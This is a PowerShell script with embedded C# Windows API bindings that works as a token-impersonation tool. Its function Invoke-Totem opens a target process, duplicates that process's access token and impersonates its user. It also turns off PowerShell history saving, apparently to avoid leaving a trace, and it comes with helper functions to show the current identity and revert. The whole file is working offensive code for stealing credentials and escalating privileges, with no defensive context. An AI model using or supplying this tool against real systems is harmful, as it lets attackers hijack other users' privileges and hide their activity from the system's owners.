Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        int dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
}
"@

function Invoke-Totem {
    param (
        [Parameter(Mandatory = $true)]
        [Int32]$processID
    )

    $processHandle = [WinAPI]::OpenProcess(0x400, $true, $processID)
    if ($processHandle -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "Error opening the process: $([ComponentModel.Win32Exception]$err)"
        return
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [WinAPI]::OpenProcessToken($processHandle, 0x0E, [ref]$tokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "Error obtaining the token: $([ComponentModel.Win32Exception]$err)"
        return
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [WinAPI]::DuplicateTokenEx(
        $tokenHandle,
        0x02000000,
        [IntPtr]::Zero,
        0x02,
        0x01,
        [ref]$dupTokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "Error duplicating the token: $([ComponentModel.Win32Exception]$err)"
        return
    }

    try {
        if (-not [WinAPI]::ImpersonateLoggedOnUser($dupTokenHandle)) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "Error impersonating the user: $([ComponentModel.Win32Exception]$err)"
            return
        }
        Set-PSReadlineOption -HistorySaveStyle SaveNothing
        $currentname = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-Host "[*] Token successfully obtained"
        Write-Host "[*] Current user: $currentname"
        Write-Host "[*] Token impersonated successfully"
    } catch {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "Error creating the process: $([ComponentModel.Win32Exception]$err)"
    } finally {
        if ($dupTokenHandle -ne [IntPtr]::Zero) {
            [WinAPI]::CloseHandle($dupTokenHandle) | Out-Null
        }
        if ($tokenHandle -ne [IntPtr]::Zero) {
            [WinAPI]::CloseHandle($tokenHandle) | Out-Null
        }
        if ($processHandle -ne [IntPtr]::Zero) {
            [WinAPI]::CloseHandle($processHandle) | Out-Null
        }
    }
}

function Invoke-TotemWhoami {
    $currentname = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Write-Host "[*] Current user: $currentname"
}

function Invoke-TotemReset {
    if (-not [WinAPI]::RevertToSelf()) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "Error reverting to the original user: $([ComponentModel.Win32Exception]$err)"
    } else {
        Write-Host "[*] Original token successfully restored"
    }
}
